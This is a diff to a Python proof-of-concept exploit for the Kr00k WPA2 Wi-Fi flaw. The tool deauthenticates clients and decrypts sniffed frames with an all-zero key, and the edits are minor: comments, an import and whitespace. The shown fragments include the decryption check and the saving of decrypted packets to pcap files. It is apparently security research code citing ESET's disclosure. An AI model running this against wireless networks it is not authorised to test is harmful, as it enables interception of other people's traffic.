@@ -15,6 +15,7 @@
 # * Decrypted stream starts with "\xaa\xaa\x03\x00\x00\x00"
 # * Nonce (104 bits) = Priority (1byte) + SRC MAC (6bytes) + PN (6bytes)
 #
+# This PoC works on WPA2 AES CCMP with Frequency 2.4GHz WLANs.
 #
 # References:
 # https://www.welivesecurity.com/wp-content/uploads/2020/02/ESET_Kr00k.pdf
@@ -43,7 +44,7 @@
 import argparse, threading 
 import datetime, sys, re
 from scapy.all import *
-from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon
+from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
 from Cryptodome.Cipher import AES
 
 
@@ -122,15 +123,16 @@ class Krooker:
             if dec_data and dec_data[0:len(KR00K_PATTERN)] == KR00K_PATTERN:
                 print("["+str(datetime.now().time())+"][+] Target "+self.target_mac+" is vulnerable to Kr00k, decrypted "+str(len(dec_data))+" bytes")
                 hexdump(dec_data)
+                # Save the encrypted and decrypted packets
                 print("["+str(datetime.now().time())+"][+] Saving encrypted and decrypted 'pcap' files in current folder")
-                dec_pkt = bytes.fromhex(re.sub(':','',self.target_mac) + re.sub(':','',self.other_mac)) + dec_data[6:]# + dec_data[8:]
+                dec_pkt = bytes.fromhex(re.sub(':','',self.target_mac) + re.sub(':','',self.other_mac)) + dec_data[6:]
                 wrpcap("enc_pkts.pcap", sniffed_pkt, append=True)
                 wrpcap("dec_pkts.pcap", dec_pkt, append=True)
                 # Uncomment this if you need a one-shoot PoC decryption 
                 #sys.exit(0)
-            else:
+            #else:
                 #print("["+str(datetime.now().time())+"][DEBUG] This data decryption with all zero TK went wrong")
-                pass
+                #pass
 
 
 
@@ -189,8 +191,6 @@ def main():
             print("Exiting, specified a not valid disassociation Reason ID: "+str(reason))
             exit(1)
 
-
-
         # Set the MAC address of the target
         if args.target == "client":
             target_mac = client_mac
@@ -224,9 +224,5 @@ def main():
         
 
 
-
-
 if __name__ == "__main__":
     main()
-
-
